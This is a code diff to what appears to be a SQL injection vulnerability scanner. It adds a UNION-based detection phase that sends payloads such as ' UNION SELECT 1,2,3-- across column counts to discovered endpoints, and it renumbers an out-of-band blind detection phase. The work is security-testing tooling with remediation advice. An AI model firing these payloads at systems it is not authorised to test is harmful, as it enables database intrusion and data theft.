@@ -14,9 +14,10 @@ Detection pipeline:
 Critical: each parameter is tested INDEPENDENTLY while all others remain at baseline.
 """
 
+import json
 import re
 import time
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
 
 from secprobe.config import Severity
 from secprobe.core.detection import Confidence, VulnType
@@ -100,12 +101,16 @@ class SQLiScanner(SmartScanner):
             include_paths=True,
         )
 
-        # Gather test URLs from crawler + target
+        # Gather test URLs from crawler + target + discovered endpoints
         test_urls = self._build_test_urls(url)
         if self.context:
             for u in self.context.get_injection_urls():
                 if u not in test_urls:
                     test_urls.append(u)
+        # Also include endpoints from attack surface
+        for injectable_url in self._get_injectable_urls():
+            if injectable_url not in test_urls:
+                test_urls.append(injectable_url)
 
         if not test_urls:
             test_urls = [
@@ -622,9 +627,66 @@ class SQLiScanner(SmartScanner):
                     print_finding(sev, f"Header SQLi: {point.name}")
                     break
 
-        # ── Phase 8: OOB (blind) detection — PER PARAMETER ──────────
+        # ── Phase 8: UNION-based SQL injection ─────────────────────
+        print_status("Phase 8: UNION-based SQL injection", "progress")
+        injectable_urls = self._get_injectable_urls()
+        for union_url in injectable_urls:
+            parsed = urlparse(union_url)
+            params = parse_qs(parsed.query, keep_blank_values=True)
+            if not params:
+                continue
+            for param_name in params:
+                point_key = (parsed.path, param_name)
+                if point_key in found_vulns:
+                    continue
+                union_found = False
+                for col_count in [9, 5, 3, 12, 7]:
+                    cols = ",".join(str(i) for i in range(1, col_count + 1))
+                    payloads = [
+                        f"')) UNION SELECT {cols}--",
+                        f"') UNION SELECT {cols}--",
+                        f"' UNION SELECT {cols}--",
+                        f") UNION SELECT {cols}--",
+                        f" UNION SELECT {cols}--",
+                    ]
+                    for payload in payloads:
+                        try:
+                            original_val = params[param_name][0] if params[param_name] else ""
+                            test_url = union_url.replace(
+                                f"{param_name}={original_val}",
+                                f"{param_name}={quote(payload)}",
+                            )
+                            resp = self.http_client.get(test_url, timeout=self.config.timeout)
+                            if resp.status_code == 200 and self._detect_union_response(resp.text, col_count):
+                                found_vulns.add(point_key)
+                                self.add_finding(
+                                    title=f"SQL Injection (UNION-based) in parameter '{param_name}'",
+                                    severity=Severity.CRITICAL,
+                                    description=(
+                                        f"UNION SELECT with {col_count} columns returned controlled data. "
+                                        f"The parameter '{param_name}' at {parsed.path} is vulnerable "
+                                        f"to UNION-based SQL injection."
+                                    ),
+                                    recommendation="Use parameterized queries or an ORM. Never concatenate user input into SQL.",
+                                    evidence=(
+                                        f"URL: {test_url}\n"
+                                        f"Payload: {payload}\n"
+                                        f"Response contained sequential integers as field values."
+                                    ),
+                                    url=union_url,
+                                    cwe="CWE-89",
+                                )
+                                print_finding(Severity.CRITICAL, f"UNION SQLi: {param_name} ({col_count} columns)")
+                                union_found = True
+                                break
+                        except Exception:
+                            continue
+                    if union_found:
+                        break
+
+        # ── Phase 9: OOB (blind) detection — PER PARAMETER ──────────
         if self.oob_available:
-            print_status("Phase 8: OOB blind SQL injection (per-parameter)", "progress")
+            print_status("Phase 9: OOB blind SQL injection (per-parameter)", "progress")
             oob_injected = 0
             for point in param_points[:10]:
                 # MySQL LOAD_FILE
@@ -692,6 +754,50 @@ class SQLiScanner(SmartScanner):
                 ),
                 category="SQL Injection",
             )
+
+    # ── Injectable URL discovery ────────────────────────────────
+    def _get_injectable_urls(self) -> list[str]:
+        """Get all injectable URLs from attack surface + root target."""
+        urls = set()
+        if self.context and hasattr(self.context, 'attack_surface') and self.context.attack_surface:
+            for ep in self.context.attack_surface.endpoints:
+                if ep.params:
+                    param_str = "&".join(f"{k}={v}" for k, v in ep.params.items())
+                    urls.add(f"{ep.url}?{param_str}" if param_str else ep.url)
+                else:
+                    urls.add(ep.url)
+            if hasattr(self.context, 'get_injection_urls'):
+                try:
+                    urls.update(self.context.get_injection_urls())
+                except Exception:
+                    pass
+        urls.add(self.config.target)
+        return list(urls)
+
+    # ── UNION response detection ─────────────────────────────────
+    def _detect_union_response(self, response_text: str, columns: int = 9) -> bool:
+        """Detect UNION injection by checking for sequential integers as field values."""
+        try:
+            data = json.loads(response_text)
+        except (json.JSONDecodeError, TypeError):
+            # Fallback: check raw text for sequential pattern
+            sequential = ",".join(f'"{i}"' for i in range(1, min(columns + 1, 6)))
+            return sequential in response_text
+
+        def check_obj(obj, depth=0):
+            if depth > 5:
+                return False
+            if isinstance(obj, dict):
+                vals = [str(v) for v in obj.values() if isinstance(v, (int, float, str))]
+                matches = sum(1 for v in vals if v.isdigit() and 1 <= int(v) <= columns)
+                if matches >= 3:
+                    return True
+                return any(check_obj(v, depth + 1) for v in obj.values())
+            elif isinstance(obj, list):
+                return any(check_obj(item, depth + 1) for item in obj[:10])
+            return False
+
+        return check_obj(data)
 
     # ── 3-Round Boolean Confirmation ─────────────────────────────
     def _confirm_boolean(self, engine, point: InsertionPoint, desc: str) -> bool:
